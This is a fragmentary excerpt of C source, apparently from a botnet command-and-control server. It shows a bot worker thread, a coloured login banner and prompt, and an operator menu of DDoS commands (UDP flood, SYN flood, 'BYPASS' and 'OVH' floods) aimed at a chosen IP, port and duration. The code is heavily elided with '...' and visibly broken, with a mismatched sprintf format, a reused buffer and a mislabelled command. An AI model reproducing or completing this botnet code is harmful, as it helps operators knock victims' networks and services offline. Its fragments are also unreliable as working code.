...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
        ...
        sprintf(password, "\x1b[0;36m*  ", accounts[find_line].username);
...
sprintf(ascii_banner_line1,   "\x1b[1;30m  _               _                  \x1b[0m\r\n");
sprintf(ascii_banner_line2,   "\x1b[1;30m |_) |  _.  _ |  | \  _   _. _|_ |_  \x1b[0m\r\n");
sprintf(ascii_banner_line3,   "\x1b[1;30m |_) | (_| (_ |< |_/ (/_ (_|  |_ | | \x1b[0m\r\n");
sprintf(ascii_banner_line4,   "\x1b[1;30m                                     \x1b[0m\r\n");
  ...
  if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		...
		while(1) {
		char input [5000];
        sprintf(input, "\x1b[1;31m%s\x1b[1;30m@\x1b[1;31mRoot  ", accounts[find_line].username);
		...
		while(fdgets(buf, sizeof buf, datafd) > 0) {   
				...
				sprintf(ls1,  "\x1b[1;31m*** UDP * !* UDP IP PORT TIME      \x1b[1;37m|\e[31m Launch A UDP Flood\r\n");
				sprintf(ls2,  "\x1b[1;31m*** VPN * !* VPN IP PORT TIME      \x1b[1;37m|\e[31m Launch A SYN Flood\r\n");
				sprintf(ls3,  "\x1b[1;31m*** NFO * !* UDP IP PORT TIME      \x1b[1;37m|\e[31m Launch A BYPASS Attack\r\n");
				sprintf(ls1,  "\x1b[1;31m*** OVH * !* OVH IP PORT TIME      \x1b[1;37m|\e[31m Launch A OVH Flood\r\n");
